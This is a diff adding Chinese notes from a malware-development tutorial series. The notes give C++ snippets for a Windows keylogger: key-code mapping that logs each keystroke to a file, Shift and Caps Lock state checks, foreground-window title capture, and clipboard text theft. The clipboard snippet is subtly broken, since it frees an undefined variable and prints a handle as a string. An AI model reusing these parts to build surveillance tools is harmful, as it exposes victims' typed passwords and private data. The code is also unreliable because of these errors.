@@ -39,7 +39,69 @@ int main()
 }
 ```
 
+---
+`GetKeyNameTextA`对一些按键不会返回名称，如：右SHIFT会返回空字符串，所以建议根据映射表手动映射： 
+```cpp
+KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+switch (kbdStruct.vkCode)
+{
+	case VK_BACK:
+		fprintf(fp, "BACKSPACE ");
+		break;
+	...
+	case 0x4F:
+		if (capLetter) { fprintf(fp, "O "); }
+		else { fprintf(fp, "o "); }
+		break;
+	...
+	default:
+		fprintf(fp, "[UNKNOWN]%04x ", kbdStruct.vkCode);
+		break;
+}
+```
+https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes  
 
+
+---
+获取一些按键状态：  
+```cpp
+// GetKeyState 返回值类型为 SHORT，2个字节，最高位表示按键是否被按下
+bool shiftPress = GetKeyState(VK_SHIFT) & 0x8000;
+// 最低位表示当前状态
+bool capsLock = GetKeyState(VK_CAPITAL) & 0x1;
+bool numLock = GetKeyState(VK_NUMLOCK) & 0x1;
+// 大写状态，简洁的异或，相当于 (capsLock && !shiftPress) || (!capsLock && shiftPress)
+bool capLetter = capsLock ^ shiftPress;
+```
+https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate  
+
+
+---
+获取当前窗口标题：  
+```cpp
+HWND curForeWindow = GetForegroundWindow();
+char curForeWindowText[264] = { 0 };
+GetWindowTextA(curForeWindow, curForeWindowText, 260);
+```
+
+
+---
+获取剪贴板文本内容：  
+```cpp
+if (IsClipboardFormatAvailable(CF_TEXT))
+{
+	OpenClipboard(NULL);
+	HANDLE cbHandle = GetClipboardData(CF_TEXT);
+	printf("[c]%s[c] ", cbHandle);
+
+	free(encodedData);
+
+	CloseClipboard();
+}
+```
+
+
+---
 原链接: https://0xpat.github.io/Malware_development_part_7/  
 
 
